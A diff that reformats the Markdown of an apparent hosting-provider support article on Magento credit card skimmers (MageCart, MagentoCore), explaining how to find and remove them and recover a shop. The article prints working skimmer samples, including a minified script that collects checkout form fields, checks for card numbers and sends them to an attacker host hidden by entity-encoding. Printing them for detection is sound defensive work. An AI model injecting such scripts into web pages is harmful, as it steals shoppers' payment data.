@@ -1,15 +1,14 @@
 <!-- source: https://support.hypernode.com/en/best-practices/security/how-to-fix-malicious-javascript-credit-card-hijack/ -->
+
 # How to Fix Malicious Javascript Credit Card Hijack
 
 The hack *Credit card Hijack* is malicious code in Magento that allows hackers to intercept financial data, such as credit card credentials. This article further explains what this security breach means, what the consequences are and how you can fix it.
 
 *We recommend checking your site with*[*Magereport.com*](http://magereport.com/)*for other vulnerabilities.*
 
+## What Is Credit Card Hijack?
 
-What Is Credit Card Hijack?
----------------------------
-
-The Credit Card Hijack is the collective name of multiple credit card skimmers which may be injected in Magento and allows hackers to capture unencrypted credit card details (like credentials). Known names are the **MagentoCore** skimmer and the **MageCart** skimmer. 
+The Credit Card Hijack is the collective name of multiple credit card skimmers which may be injected in Magento and allows hackers to capture unencrypted credit card details (like credentials). Known names are the **MagentoCore** skimmer and the **MageCart** skimmer.
 
 This check indicates whether your shop is injected with malware. However, it is not possible for MageReport to check which malware infected your shop.
 
@@ -21,15 +20,13 @@ In 2015 we analyzed the malware and found out that a staggering amount of 3500 M
 
 We suspect this leak has been made possible due to unpatched Magento shops. So if you haven’t completely patched your Magento shop yet, make sure you do. Use Magereport.com to check if there are any patches not yet installed.
 
-What Are the Consequences?
---------------------------
+## What Are the Consequences?
 
 Credit Card Hijack allows hackers to intercept your customers financial data. With this information they can commit global credit card fraud, causing a lot of financial damage.
 
 The fraud can be traced back to May 12th 2015, which implies the malpractice went unnoticed for months and is still active.
 
-How Do I Fix It?
-----------------
+## How Do I Fix It?
 
 *Fixing this breach is not an easy task. If you don’t have a lot of knowledge of Magento’s security, we recommend you hire an Magento developer or specialist experienced in Magento security.*
 
@@ -46,13 +43,13 @@ Review all admin users in your system via Magento’s backend (navigate to syste
 Search your shop for scripts similar to the ones below and remove them. Searching and removing can be done via Magento’s backend. Once logged in to your backend (screenshots below):
 
 1. Navigate to ‘System’ -> Configuration
-![](_res/_EC5-TnORl1F5LROwDSHdbtXWyqhY6zx7A.png)
-2. Go to ‘Design’ under ‘General’
-![](_res/OYuuBvfAcJuTp9mnQ5m0uHdmap9USRS9nw.png)
-3. Scroll down and open HTML Head to check ‘Miscellaneous Scripts’
-![](_res/RSWx-oakxkntqQ5Mwws3vH6n_vSonTqKXg.png)
-4. Scroll down and open Footer to check Miscellaneous HTML
-![](_res/RUyelZfnnB8vcjKWctD9LYMDicwjrgdaQg.png)
+   ![](_res/_EC5-TnORl1F5LROwDSHdbtXWyqhY6zx7A.png)
+1. Go to ‘Design’ under ‘General’
+   ![](_res/OYuuBvfAcJuTp9mnQ5m0uHdmap9USRS9nw.png)
+1. Scroll down and open HTML Head to check ‘Miscellaneous Scripts’
+   ![](_res/RSWx-oakxkntqQ5Mwws3vH6n_vSonTqKXg.png)
+1. Scroll down and open Footer to check Miscellaneous HTML
+   ![](_res/RUyelZfnnB8vcjKWctD9LYMDicwjrgdaQg.png)
 
 **If Miscellaneous scripts and Miscellaneous HTML are empty, you’re most likely safe. If not, check if they contain the scripts below.**
 
@@ -61,6 +58,7 @@ The script below is an example of a minified version of the [scraper Javascript]
 ```nginx
 &lt;script&gt;function jj(e){var t="; "+document.cookie,o=t.split("; "+e+"=");return 2==o.length?o.pop().split(";").shift():void 0}jj("SESSIID")||(document.cookie="SESSIID="+(new Date).getTime()),jQuery(function(e){e("button").on("click",function(){var t="",o="post",n=window.location;if(new RegExp("onepage|checkout").test(n)){for(var c=document.querySelectorAll("input, select, textarea, checkbox"),i=0;i&lt;c.length;i++)if(c[i].value.length&gt;0){var a=c[i].name;""==a&amp;&amp;(a=i),t+=a+"="+c[i].value+"&amp;"}if(t){var l=new RegExp("[0-9]{13,16}"),u=new XMLHttpRequest;u.open(o,e("&lt;div /&gt;").html("&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#115;&amp;#58;&amp;#47;&amp;#47;&amp;#98;&amp;#97;&amp;#100;&amp;#46;&amp;#103;&amp;#117;&amp;#121;&amp;#47;&amp;#106;&amp;#113;&amp;#117;&amp;#101;&amp;#114;&amp;#121;&amp;#46;&amp;#112;&amp;#104;&amp;#112; ").text(),!0),u.setRequestHeader("Content-type","application/x-www-form-urlencoded"),u.send(t+"&amp;asd="+(l.test(t.replace(/s/g,""))?1:0)+"&amp;utmp="+n+"&amp;cookie="+jj("SESSIID")),console.clear()}}})});&lt;/script&gt;
 ```
+
 The script below is an example of Credit Card Hijack’s malicious code. It installs the functions ‘send’ and ‘clk’, which allows hackers to collect the names and content of every common form input element, when your customer clicks a button or submits a form.
 
 ```nginx
@@ -126,6 +124,7 @@ console.clear();
 
 &lt;/script&gt;
 ```
+
 The script below was found during the research done by Hypernode. It covers the same functionality as the script above, but is harder to spot because it’s included in a minimised form. In this script Jquery is used to add unnamed click event-handler to every button on the page. If someone clicks the button, the function is triggered and allowed to collect al input data. It checks for credit card numbers and this information is sent off to their data collection server.
 
 ```nginx
@@ -161,14 +160,13 @@ The script below was found during the research done by Hypernode. It covers the 
  });
 &lt;/script&gt;
 ```
-Recover Your Shop
------------------
+
+## Recover Your Shop
 
 Since Credit Card Hijack is an ongoing credit card fraud dating from May 2015, it’s difficult to pinpoint how exactly the hackers got in. We assume it’s due to a combination of various know Magento leaks. It’s likely hackers used these security vulnerablities to set up this credit card fraud.
 
 We recommend you ‘clean’ your shop following the steps written in the article [Recover a Hacked Magento Shop](https://support.hypernode.com/knowledgebase/recover-a-hacked-magento-shop/) after installing all Magento patches, deleting inactive Magento admins and removing malicious code.
 
-Need Help?
-----------
+## Need Help?
 
 Magento is no easy open source CMS. Although we’re very skilled in hosting Magento shops, making them fast and keeping conversion high, we’re no Magento developers. Luckily, we know a lot of agencies that do know a lot about how Magento works. If you need help, don’t hesitate to [contact one of these agencies](https://www.magereport.com/page/support).
